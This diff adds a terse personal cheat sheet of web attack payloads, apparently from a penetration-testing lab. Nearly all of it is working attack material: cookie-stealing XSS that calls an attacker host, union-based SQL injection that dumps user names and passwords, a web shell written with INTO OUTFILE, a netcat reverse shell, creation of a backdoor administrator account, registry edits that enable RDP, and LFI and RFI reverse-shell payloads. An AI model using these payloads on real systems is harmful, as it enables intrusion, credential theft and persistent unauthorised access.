@@ -1,0 +1,92 @@
+<script>alert("XSS")</script>
+
+set up netcat on port 81. This is enumeration.
+
+<iframe SRC="http://10.11.0.73:81/report" height="0" width="0"></iframe>
+
+Stealing cookies. set nc listener on 81 and wait to catch the cookies
+
+<script> 
+new Image().src="http://10.11.0.73:81/bogus.php?output="+document.cookie;
+</script>
+
+classic bypass: you might need to mess with the terminator at the end depending on the php or asp service number.
+
+student' or 1=1 LIMIT 1;#
+
+Blind testing SQL:
+
+http://~~~~~~/~.php?id=738 order by 1
+http://~~~~~~/~.php?id=738 order by 2
+http://~~~~~~/~.php?id=738 order by 3
+
+Until it spits out a message that the column doesn't exist. It is important to know how many columns there are. 
+
+Shows up with numbers on the page to tell you where each column sits.
+
+http://~~~~~~/~.php?id=738 union all select 1,2,3,4,5,6 
+
+version:
+http://~~~~~/~.php?id=738 union all select 1,2,3,4,@@version,6
+users:
+http://~~~~~/~.php?id=738 union all select 1,2,3,4,user(),6
+tables layout
+http://~~~~~/~.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables
+targeting users table:
+http://~~~~~/~.php?id=738 union all select 1,2,3,4,column_name, 6 FROM information_schema.columns where table_name='users'
+dumping names and passwords, you might need to play with this a bit:
+http://~~~~~/~.php?id=738 union all select 1,2,3,4,concat(name,0x3a,password),6 FROM users
+
+loading host info:
+
+http://~~~~~/~.php?id=738 union select all 1,2,3,4,load_file('c:/windows/system32/drivers/etc/hosts'),6
+
+Creating an outfile:
+
+http://~~~~/~.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/sluts.php'
+
+http://10.11.8.148/fucker.php?cmd=nc -nv 10.11.0.73 53 -e cmd.exe
+
+If it's windows without NC:
+Add user from Windows command line:
+net user /add myID myPassword
+
+new localgroup administrators myID /add
+
+You can start a RDP or SSH service and log in with your new name.
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+and/or 
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+
+
+Fuzzing set parameters to get an injection point:
+
+<script src=http://10.11.0.73/php_full_reverse.php></script> 
+
+
+LFI:
+Same as outfile but loaded into existing logs.
+
+nc -nv 10.11.1. 
+<?php echo shell_exec($_GET['cmd']);?>
+
+then from the url:
+
+http://~~~~/comment.php?id=../../../../../../../../windows/system32/drivers/etc/hosts%00
+
+http://~~~~/comment.php?id=111&cmd=ipconfig&lang=../../../../../../../../windows/system32/drivers/etc/hosts%00
+
+you can open nc from cmd= or add a new user or get the passwords.
+
+
+RFI:
+
+http://10.11.1.~/something.php?name=rick&comment=morty&LANG=http://10.11.0.73/php_full_reverse.txt
+
+If it appends the php, good. it'll start a reverse shell to your box. 
+
+If all else fails, use simplephp.txt in your www folder and start with simple cmd's and build up from there.
+
